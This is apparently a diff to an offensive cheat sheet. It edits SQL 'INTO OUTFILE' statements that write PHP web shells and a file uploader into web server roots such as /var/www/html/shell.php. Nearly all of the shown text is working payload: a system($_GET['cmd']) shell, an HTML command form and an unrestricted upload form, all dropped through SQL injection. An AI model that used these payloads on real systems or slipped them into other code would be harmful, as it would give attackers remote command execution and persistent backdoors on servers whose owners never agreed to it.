@@ -47,7 +47,7 @@ SELECT '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/she
 
 SELECT '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE 'C:\\inetpub\\wwwroot\\phpmyadmin\\config\\shell.php';
 
-SELECT '<HTML><BODY><FORM METHOD="GET" NAME="myform" ACTION=""><INPUT TYPE="text" NAME="cmd"><INPUT TYPE="submit" VALUE="Send"></FORM><pre><?php if($_GET["cmd"]) {​​system($_GET["cmd"]);}​​ ?> </pre></BODY></HTML>' INTO OUTFILE '/var/www/phpMyAdmin/cmd.php'
+SELECT '<HTML><BODY><FORM METHOD="GET" NAME="myform" ACTION=""><INPUT TYPE="text" NAME="cmd"><INPUT TYPE="submit" VALUE="Send"></FORM><pre><?php if($_GET["cmd"]) {​​system($_GET["cmd"]);}​​ ?> </pre></BODY></HTML>' INTO OUTFILE '/var/www/html/shell.php'
 ```
 
 ### 2.3 - Uploader
@@ -102,7 +102,7 @@ One liner PHP code.
 SQL Query for reference.
 
 ```sql
-SELECT '<?php if(isset($_POST[\'submit\'])){$t=\'./\';$f=$t.basename($_FILES[\'fileToUpload\'][\'name\']);if(move_uploaded_file($_FILES[\'fileToUpload\'][\'tmp_name\'],$f))echo"File uploaded successfully.";else echo"Sorry, there was an error uploading your file.";}?>\n<!DOCTYPE html><html lang=\"en\"><head><meta charset=\"UTF-8\"><meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"><title>File Upload</title></head><body><h2>File Upload</h2><form action=\"<?=$_SERVER[\'PHP_SELF\']?>\" method=\"POST\" enctype=\"multipart/form-data\"><input type=\"file\" name=\"fileToUpload\" id=\"fileToUpload\"><input type=\"submit\" value=\"Upload\" name=\"submit\"></form></body></html>' INTO OUTFILE '/path/to/uploader.php'
+SELECT '<?php if(isset($_POST[\'submit\'])){$t=\'./\';$f=$t.basename($_FILES[\'fileToUpload\'][\'name\']);if(move_uploaded_file($_FILES[\'fileToUpload\'][\'tmp_name\'],$f))echo"File uploaded successfully.";else echo"Sorry, there was an error uploading your file.";}?>\n<!DOCTYPE html><html lang=\"en\"><head><meta charset=\"UTF-8\"><meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"><title>File Upload</title></head><body><h2>File Upload</h2><form action=\"<?=$_SERVER[\'PHP_SELF\']?>\" method=\"POST\" enctype=\"multipart/form-data\"><input type=\"file\" name=\"fileToUpload\" id=\"fileToUpload\"><input type=\"submit\" value=\"Upload\" name=\"submit\"></form></body></html>' INTO OUTFILE '/var/www/html/uploader.php'
 ```
 
 - PHP uploader with table view
